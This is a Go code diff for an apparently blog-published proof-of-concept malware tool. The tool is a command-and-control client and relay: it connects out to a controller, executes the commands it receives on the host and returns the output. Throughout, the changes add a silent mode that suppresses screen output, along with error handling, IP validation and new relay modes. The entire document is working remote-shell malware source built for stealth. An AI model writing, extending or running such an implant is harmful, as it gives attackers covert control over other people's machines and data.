@@ -12,6 +12,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"regexp"
 	"runtime"
 	"strings"
 	"time"
@@ -20,11 +21,18 @@ import (
 // "/Blog/POC_Malwarez/arp_connect_main/ARP"
 
 /* TO DO
-//to add quiet mode
-// NO PRINTING TO SCREEN
-// CHECK IF CLIENT AND PARENT WORK ON LINUX
+
+[DONE] NO PRINTING TO SCREEN
+CHECK IF CLIENT AND PARENT WORK ON LINUX
 
 Add TLS within itself
+
+error handlign to identify if connection is dropped
+
+might be worth making a function for sending and receiving?
+
+
+// when launching parent mode, if admin is not ready it crashes
 
 */
 
@@ -42,7 +50,7 @@ var (
 	// TLS or NO TLS
 	tlsOn = flag.Bool("tls", false, "Will add TLS to the network traffic")
 	// Mode to be run in
-	mode  = flag.String("mode", "", "mode {client|parent|list}")
+	mode  = flag.String("mode", "", "mode {client|parent|clientlist|parentlist}")
 	quiet = flag.Bool("silence", false, "To run in quiet mode, nothing will be printed to the screen")
 )
 
@@ -64,13 +72,13 @@ func checkError(err error) {
 func OSCheck() string {
 	var OSShell string
 	if runtime.GOOS == "windows" {
-		fmt.Println("OS identified as Windows")
+		fmt.Println(quietCheck("OS identified as Windows"))
 		//command =
 		OSShell = "windows"
 		// err := ni
 
 	} else if runtime.GOOS == "linux" {
-		fmt.Println("OS identified as: Linux")
+		fmt.Println(quietCheck("OS identified as: Linux"))
 		OSShell = "linux"
 
 	}
@@ -134,7 +142,7 @@ func listMode(c net.Conn) {
 		fmt.Println("Running in Command List Mode")
 	}
 
-	if *skipEnter == false || *quiet == false {
+	if *skipEnter == false {
 		reader := bufio.NewReader(os.Stdin)
 		fmt.Println("<PRESS ENTER TO CONTINUE>")
 		_, _ = reader.ReadString('\n')
@@ -146,9 +154,9 @@ func listMode(c net.Conn) {
 	// 	return
 	// }
 	defer c.Close()
-	fmt.Println("Attempting to connect to ", *clientConnect, "\n")
-	fmt.Println("===Connection successful==")
-	fmt.Println("Reading Commands list")
+	// fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to ", *clientConnect, "\n")))
+	// fmt.Println(quietCheck("===Connection successful=="))
+	fmt.Println(quietCheck("Reading Commands list"))
 
 	// if c has no connect, break
 
@@ -158,7 +166,7 @@ func listMode(c net.Conn) {
 	decoder.Decode(&inputTest)
 	checkOS := OSCheck()
 	for _, value := range inputTest.CommandsList {
-		fmt.Println("Command Received->: " + value)
+		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + value)))
 
 		commandString := executeCommand(checkOS, value)
 
@@ -168,7 +176,7 @@ func listMode(c net.Conn) {
 		encoder.Encode(commandString)
 		// decoder := json.NewDecoder(c)
 		// decoder.Decode(&outputTest)
-		fmt.Println("Encoded format:", commandString)
+		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandString)))
 	}
 }
 
@@ -197,11 +205,13 @@ func connectTLS() net.Conn {
 			// fmt.Printf("Attempting to connect to %s with TLS \n ", *clientConnect)
 			connparent, err = tls.Dial("tcp", *clientConnect, &config)
 			// c, err := net.Dial("tcp", CONNECT)
-			fmt.Println(quietCheck("===Connection Successful=="))
+
 			if err != nil {
 				fmt.Println(err)
+				os.Exit(1)
 			}
-		} else if *mode == "list" {
+			fmt.Println(quietCheck("===Connection Successful=="))
+		} else if *mode == "clientlist" {
 			fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
 			connparent, err = tls.Dial("tcp", *clientConnect, &config)
 			// c, err := net.Dial("tcp", CONNECT)
@@ -219,7 +229,7 @@ func connectTLS() net.Conn {
 				fmt.Println(err)
 			}
 		} else if *mode == "parentlist" {
-			fmt.Printf("Attempting to connect to %s with TLS \n", *parentConnect)
+			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with TLS \n", *parentConnect)))
 			connparent, err = tls.Dial("tcp", *parentConnect, &config)
 			// c, err := net.Dial("tcp", CONNECT)
 			fmt.Println(quietCheck("===Connection Successful=="))
@@ -236,7 +246,7 @@ func connectTLS() net.Conn {
 			// 	fmt.Println(err)
 			// }
 
-		} else if *mode == "list" {
+		} else if *mode == "clientlist" {
 			fmt.Println(quietCheck(fmt.Sprintf("Attempting to connect to %s with no TLS \n", *clientConnect)))
 			connparent, _ = net.Dial("tcp", *clientConnect)
 
@@ -246,6 +256,7 @@ func connectTLS() net.Conn {
 			connparent, err = net.Dial("tcp", *parentConnect)
 			if err != nil {
 				fmt.Println(err)
+				os.Exit(1)
 			}
 			fmt.Println(quietCheck("===Connection Successful=="))
 
@@ -256,75 +267,6 @@ func connectTLS() net.Conn {
 			// c, err := net.Dial("tcp", CONNECT)
 			fmt.Println(quietCheck("===Connection Successful=="))
 		}
-		// }
-		// } else if *tlsOn == true {
-		// 	CA_Pool := x509.NewCertPool()
-		// 	severCert, err := ioutil.ReadFile("../openssl/mydomain.com.crt")
-		// 	if err != nil {
-		// 		log.Fatal("Could not load server certificate!")
-		// 	}
-		// 	CA_Pool.AppendCertsFromPEM(severCert)
-
-		// 	config := tls.Config{RootCAs: CA_Pool}
-
-		// 	if *mode == "client" {
-		// 		fmt.Printf("Attempting to connect to %s with TLS \n ", *clientConnect)
-		// 		connparent, err = tls.Dial("tcp", *clientConnect, &config)
-		// 		// c, err := net.Dial("tcp", CONNECT)
-		// 		fmt.Println("===Connection Successful==")
-		// 		if err != nil {
-		// 			fmt.Println(err)
-		// 		}
-		// 	} else if *mode == "list" {
-		// 		fmt.Printf("Attempting to connect to %s with no TLS \n", *clientConnect)
-		// 		connparent, err = tls.Dial("tcp", *clientConnect, &config)
-		// 		// c, err := net.Dial("tcp", CONNECT)
-		// 		if err != nil {
-		// 			fmt.Println(err)
-		// 		}
-
-		// 		fmt.Println("===Connection Successful==")
-		// 	} else if *mode == "parent" {
-		// 		fmt.Printf("Attempting to connect to %s with TLS \n", *parentConnect)
-		// 		connparent, err = tls.Dial("tcp", *parentConnect, &config)
-		// 		// c, err := net.Dial("tcp", CONNECT)
-		// 		fmt.Println("===Connection Successful==")
-		// 		if err != nil {
-		// 			fmt.Println(err)
-		// 		}
-		// 	} else if *mode == "parentlist" {
-		// 		fmt.Printf("Attempting to connect to %s with TLS \n", *parentConnect)
-		// 		connparent, err = tls.Dial("tcp", *parentConnect, &config)
-		// 		// c, err := net.Dial("tcp", CONNECT)
-		// 		fmt.Println("===Connection Successful==")
-		// 	}
-
-		// } else {
-		// 	if *mode == "client" {
-
-		// 		connparent, _ = net.Dial("tcp", *clientConnect)
-
-		// 		// if err != nil {
-		// 		// 	fmt.Println(err)
-		// 		// }
-
-		// 	} else if *mode == "list" {
-
-		// 		connparent, _ = net.Dial("tcp", *clientConnect)
-
-		// 	} else if *mode == "parent" {
-
-		// 		connparent, err = net.Dial("tcp", *parentConnect)
-		// 		if err != nil {
-		// 			fmt.Println(err)
-		// 		}
-
-		// 	} else if *mode == "parentlist" {
-
-		// 		connparent, _ = net.Dial("tcp", *parentConnect)
-		// 		// c, err := net.Dial("tcp", CONNECT)
-
-		// 	}
 
 	}
 	// need to add parent mode LISTEN
@@ -335,7 +277,7 @@ func clientMode(c net.Conn) {
 
 	defer c.Close()
 
-	fmt.Println("Listening for commands")
+	fmt.Println(quietCheck("Listening for commands"))
 	checkOS := OSCheck()
 	for {
 
@@ -343,8 +285,12 @@ func clientMode(c net.Conn) {
 
 		commandString := bufio.NewScanner(c)
 		commandString.Scan()
+		if err := commandString.Err(); err != nil {
+			log.Println("ERROR: " + err.Error())
+			os.Exit(1)
+		}
 
-		fmt.Println("Command Received->: " + commandString.Text())
+		fmt.Println(quietCheck(fmt.Sprintf("Command Received->: " + commandString.Text())))
 		value := string(commandString.Text())
 		if strings.TrimSpace(value) == "STOP" {
 			fmt.Println("TCP client exiting...")
@@ -355,13 +301,15 @@ func clientMode(c net.Conn) {
 		commandresults := executeCommand(checkOS, value)
 
 		encoder := json.NewEncoder(c)
+		if err := encoder.Encode(commandresults); err != nil {
+			log.Println("ERROR sending: " + err.Error())
 
-		encoder.Encode(commandresults)
+			return
+		}
 
-		fmt.Println("Encoded format:", commandresults)
+		fmt.Println(quietCheck(fmt.Sprintf("Encoded format:", commandresults)))
 
 	}
-
 }
 
 func parentListMode(c net.Conn) {
@@ -384,7 +332,8 @@ func parentListMode(c net.Conn) {
 	} else {
 		listenChild, err = net.Listen("tcp", PORT)
 		if err != nil {
-			fmt.Println("Error")
+			fmt.Println("Error:", err)
+
 		}
 	}
 
@@ -405,7 +354,11 @@ func parentListMode(c net.Conn) {
 	// need to Decode
 	var inputTest Results
 	decoder := json.NewDecoder(c)
-	decoder.Decode(&inputTest)
+	if err := decoder.Decode(&inputTest); err != nil {
+		log.Println("ERROR Receiving Command List to foward to Client: " + err.Error())
+		// os.exit()
+		return
+	}
 	// sending to child
 	encoder := json.NewEncoder(childconnect)
 	// fmt.Printf("current time is :%s", currentTime.Format("2006-01-02 15:04:05"))
@@ -420,10 +373,19 @@ func parentListMode(c net.Conn) {
 	for x := 0; x < len(inputTest.CommandsList); x++ {
 		//receiving and decoding from Child
 		decoder := json.NewDecoder(childconnect)
-		decoder.Decode(&outputTest)
+		if err := decoder.Decode(&outputTest); err != nil {
+			log.Println("ERROR Receiving Results from Child " + err.Error())
+			// os.exit()
+			return
+		}
 		//encoding and sending to Admin
 		encoder := json.NewEncoder(c)
-		encoder.Encode(outputTest)
+
+		if err := encoder.Encode(outputTest); err != nil {
+			log.Println("ERROR Sending Results to Admin: " + err.Error())
+			// os.exit()
+			return
+		}
 	}
 
 }
@@ -473,10 +435,14 @@ func parentMode(c net.Conn) {
 
 		//var results string
 		//Reading in ADMIN COMMAND
-		commandString, _ := bufio.NewReader(c).ReadString('\n')
-		if *quiet == false {
-			fmt.Print("COMMAND RECEIVED FROM ADMIN->: " + commandString)
+		commandString, err := bufio.NewReader(c).ReadString('\n')
+		// commandString, err := ioutil.ReadAll(c)
+		if err != nil {
+			log.Println("ERROR: " + err.Error())
+			os.Exit(1)
 		}
+
+		fmt.Print(quietCheck(fmt.Sprintf("COMMAND RECEIVED FROM ADMIN->: " + commandString)))
 
 		if strings.TrimSpace(string(commandString)) == "STOP" {
 			if *quiet == false {
@@ -507,11 +473,24 @@ func parentMode(c net.Conn) {
 	}
 }
 
+func validateAddress(connect string, name string) {
+	patternIP := "^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}:([0-9]{1,4}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$"
+	regexIP, _ := regexp.MatchString(patternIP, connect)
+	if regexIP == false {
+
+		fmt.Println("ERROR: NOT IN CORRECT IP FORMAT such as 192.168.0.1:1234")
+		fmt.Println("Supplied: ", name, connect)
+		os.Exit(1)
+	}
+	return
+}
+
 func main() {
 	// flags declaration using flag package for CLI arguments
 	// mode := flag.String("mode", "", "mode {client|parent|list}")
 
 	// commands := flag.Bool("commands", false, "Execute a list of commands")
+	// regex for IP
 
 	//parsing flags
 	flag.Parse()
@@ -522,19 +501,21 @@ func main() {
 		os.Exit(1)
 	}
 
-	if *quiet == false {
-		fmt.Printf("Using %s mode \n", *mode)
-	}
+	fmt.Println(quietCheck(fmt.Sprintf("Using %s mode \n", *mode)))
 
 	if *mode == "client" {
-
+		validateAddress(*clientConnect, "-clientconnect")
 		clientMode(connectTLS())
 	} else if *mode == "parent" {
-
+		validateAddress(*parentConnect, "-parentconnect")
+		validateAddress(*parentListen, "-parentlisten")
 		parentMode(connectTLS())
-	} else if *mode == "list" {
+	} else if *mode == "clientlist" {
+		validateAddress(*clientConnect, "-clientconnect")
 		listMode(connectTLS())
 	} else if *mode == "parentlist" {
+		validateAddress(*parentConnect, "-parentconnect")
+		validateAddress(*parentListen, "-parentlisten")
 		parentListMode(connectTLS())
 	} else {
 		fmt.Println("ERROR No correct modes")
